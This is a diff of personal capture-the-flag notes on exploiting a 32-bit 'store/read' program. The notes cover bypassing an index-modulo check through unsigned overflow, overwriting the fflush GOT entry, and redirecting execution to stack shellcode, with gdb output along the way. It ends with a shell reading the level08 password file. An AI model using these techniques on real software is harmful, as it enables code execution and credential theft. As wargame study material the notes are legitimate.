@@ -1,57 +1,22 @@
-/***********************/
-/* P R O T E C T I O N */
-/***********************/
 
-- Partial RELRO
-- Canrary found 
+/**********************************************/
+    P R O G R A M    E X P L A N A T I O N S
+/**********************************************/
 
-/********************************/
-/*	   R E V E R S E	*/
-/********************************/
+=> We can run 3 commands in this program
 
-local_1bc[100] = {0}
-local_28[20] = {0}
+=> "store" allow us to write a number (uint) at buffer[index*4], where index is also a uint
+We have the possiblity to write in our stack than the condition are met (index is not multiple of 3 AND the 8 most significants bytes of number begin by B7000000 - 3070230528
 
--> set local_1bc {0}
--> set param2 (args) a {0}
--> set env = {0}
+=> "read" can read an unsigned int from the index buffer[index*4]
 
-loop
--> wait command of 0x14
--> get len(input)
+=> "quit" quit the program
 
-store number:
-	-> param1 = buffer[100]
-	-> number uint
-	-> index uint
-	-> index % 3 != 0 && (number >> 0x18 != 0xb7 (183))	
-	-> (param1 + index) = number
+/********************************************/
+		S T R A T E G Y 
+/********************************************/
 
-read number:
-	-> param1 = buffer[100]
-	-> index uint
-	-> print with buffer[index] (%u) <- possible to read stack 
-
-
-/****************/
-/*   I N F O S  */
-/****************/
-
-segfault read command -> ~680
-
-buffer[100]
-start buffer:	0xffffd574
-
-
-
-/*****************************/
-/*	S T R A T E G Y      */
-/*****************************/
-
--> Possible to write in the stack and sections by negative index or utin overflow
-
-
-F A I L :
+=====> F A I L =====>
 - cannot overwrite ret addr of main (index 114)
 can overwrite ebp 113 but not ret addr 114
 - cannot overwrite ret addr of store_number (-11) 
@@ -59,9 +24,108 @@ same like probleme like index ret addr main
 => mainly because of % 3
 
 
-New Strategy
+=====> New Strategy  =====>
+=> Let's try to overwrite an address in the got.plt entry 
+=> It seems possible because it has more than 3 addr functions so we can access one of them (counter % 3)
 
--> Try to overwrite got.plt entry -> Possible because it has more than 3 addr (counter % 3)
+/*****************************/
+	G O T . P L T 
+/*****************************/
+
+=> Firstly we need to find the index of the buffer 
+Input command: store
+ Number: 55 (0x37)
+ Index: 1
+0xffffd570:	0x00000000 0x00000000 <- buffer[0]  0x00000037 (55) <- buffer[1] 0x00000000
+buffer[0]:	0xffffd574
+
+=> Now we need to have the offset to acces the got.plt table from the buffer address
+
+
+0xffffffff - 0xffffd574 => 
+End stack  - buffer[0]  =>
+4294967295 - 4294956404 = 10891 
+
+=> We will focus the fflush@got.plt address
+804a004 (134520836) <fflush@got.plt>:     0xf7e90880
+804a004 + (0xff... - buffer[0]) = 134520836 + 10891 = 134531727
+
+(gdb) x 0xffffd574 + 134531727 (buffer[0] + index)
+0x804a003 <printf@got.plt+3>:	0x048486f7
+
+=> We have the address 0x804a003 we need to add 1 to have 804a004 (printf@got.plt)
+
+(gdb) x 0xffffd574 + 134531728
+0x804a004 <fflush@got.plt>:	0x08048486
+
+=> We then divide it by 4 and check if it pass the modulo condition (% 3)
+134531728 ÷ 4 = 33632932
+33632932 % 3 = 1
+=> The index is not a multiple of 3
+
+Input command: store
+ Number: 55
+ Index: 33632932
+...
+(gdb) c
+Input command: store
+Program received signal SIGSEGV, Segmentation fault.
+0x00000037 in ?? ()
+
+=> The redirection of fflush is redirect to an arbitrary address (number)  
+=> We can redirect the execution of printf to the stack
+buffer[1] = 0xffffd578 = 4294956408
+
+=> We try it with a sigtrap
+Input command: store
+ Number: 3435973836 (\xcc\xcc\xcc\xcc)
+ Index: 1 (buffer[1])
+...
+Input command: store
+ Number: 4294956408 (buffer[1])
+ Index: 33632932 (index * 4 to write to fflush@got.plt)
+...
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0xffffd579 in ?? ()
+
+
+/******************************************/
+	 S H E L L    C O D E 
+/******************************************/
+
+
+=> Now that we can redirect the execution to buffer[1] we will write a shell code in that buffer
+=> We have a problem that we can't write more that 2 consecutive addresses because of the modulo 3
+=> So to resolve this problem we will slice our buffer with a jump every two adresses
+
+
+gdb 67 64 62
+env 65 6e 76
+
+-2 +10 +20 
+
+= 28
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 store:
         number: 55
         index: 33632933 in gdb (!!! 33632936 in vm !!!)
@@ -152,6 +216,7 @@ Input command: store
 Input command: store
 Trace/breakpoint trap (core dumped)
 
+***********************************************************************
 
 
 Input command: store
@@ -206,8 +271,6 @@ Input command: store
 $ whoami
 level08
 $ cat /home/users/level08/.pass
-7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
-$ 
 
 /*******************************************************************/
 
